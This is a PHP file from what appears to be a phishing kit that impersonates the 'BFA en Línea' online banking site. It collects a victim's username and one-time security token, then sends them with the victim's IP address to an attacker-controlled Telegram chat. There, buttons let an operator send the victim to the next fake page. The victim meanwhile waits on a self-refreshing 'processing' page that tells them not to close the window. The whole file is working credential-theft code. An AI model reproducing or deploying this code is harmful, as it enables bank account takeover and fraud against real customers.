<?php
session_start();
include('settings.php');

// === PRIMERA VISITA (POST desde tok.html): enviar token a Telegram ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = $_SESSION['usuario'] ?? null;
    $tok     = trim($_POST['tok'] ?? '');
    if (!$usuario || !$tok) { header("Location: tok.html"); exit; }

    $ip  = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
    $msg = "🔐 TOKEN BFA\n👤 Usuario: $usuario\n🔑 Token: $tok\n🌐 IP: $ip";

    tg_request('sendMessage', [
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'reply_markup' => json_encode([
            'inline_keyboard' => [[
                ['text' => '✅ Token OK',    'callback_data' => "LISTO|$usuario"],
                ['text' => '❌ Token Error', 'callback_data' => "COMPRA|$usuario"]
            ]]
        ])
    ]);
}

// === ESPERA ===
$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) { header("Location: index.php"); exit; }

$archivo = "acciones/$usuario.txt";
if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    @unlink($archivo);
    switch ($accion) {
        case '/LISTO':
            header("Location: listo.html"); exit;
        case '/COMPRA':
            header("Location: tokx.html"); exit;
    }
}
?>
<!DOCTYPE html>
<html lang="es"><head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="1">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BFA en Línea - Procesando</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;background:#fff;font-family:'Segoe UI',sans-serif;color:#022a4f}
  img{max-width:420px;width:55vw;height:auto}
  p{margin-top:18px;font-size:14px;color:#888;text-align:center}
</style>
</head><body>
  <img src="img/loading.gif" alt="Cargando...">
  <p>⚠️ No cierres esta ventana</p>
</body></html>
